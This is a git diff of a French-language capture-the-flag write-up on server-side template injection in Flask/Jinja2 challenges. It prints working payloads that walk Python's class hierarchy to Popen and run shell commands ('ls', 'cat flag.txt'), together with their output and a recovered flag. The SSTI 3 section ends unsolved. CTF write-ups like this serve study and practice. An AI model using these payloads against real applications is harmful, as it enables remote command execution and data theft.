@@ -41,11 +41,20 @@ Aussi du Flask, donc on peut utiliser `{{8*8}}`.
 En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_2/config.dump.txt) mais le flag ne s'y trouve pas.  
 En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_2/class.dump.txt).  
 Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268:]}}` permet de recuperer la class Popen.  
-Utiliser la Popen nou permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nou renvoi `(b'app.py\nconfig.py\nflag.txt\nindex.html\n', None)`.  
+Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'app.py\nconfig.py\nflag.txt\nindex.html\n', None)`.  
 On peut voir un fichier appelé flag.txt, pour l'afficher, on peut utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[268]('cat flag.txt', shell=True,stdout=-1).communicate()}}`, ce qui nous donne: `(b'BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}', None)`.  
 On a donc trouvé le flag `BFS{w0w_1_C4n_R3ad_Fl4g_W1th_Pyth0n_SST1}`
 
-### :x: SSTI 3
+### :white_circle: SSTI 3
+
+Encore du Flask, on peut toujour utiliser `{{8*8}}`.  
+En utilisant `{{config.items()}}` on peut obtenir la config du server [cf config dump](/SSTI/SSTI_3/config.dump.txt) mais le flag ne s'y trouve pas non plus.  
+En utilisant `{{''.__class__.__mro__ [1].__subclasses__()}}` on peut recuperer la liste de class disponnibles [cf class dump](/SSTI/SSTI_3/class.dump.txt).  
+Utiliser `{{ ''.__class__.__mro__ [1].__subclasses__()[409:]}}` permet de recuperer la class Popen.  
+Utiliser la Popen nous permet d'utiliser cette commande: `{{ ''.__class__.__mro__ [1].__subclasses__()[409]('ls', shell=True,stdout=-1).communicate()}}`, ce qui nous renvoi `(b'app.py\nconfig.py\ngetFlag\nindex.html\n', None)`.  
+Utiliser la commande `{{''.__class__.__mro__ [1].__subclasses__()[409]('cat getFlag', shell=True,stdout=-1).communicate()}}` nous donne le contenue du fichier [cf: getFlag](/SSTI/SSTI_3/getFlag).  
+Le fichier [getFlag](/SSTI/SSTI_3/getFlag) semble etre un executable mais il ne veux pas se lancer.
+
 
 ### :x: SSTI 4
 
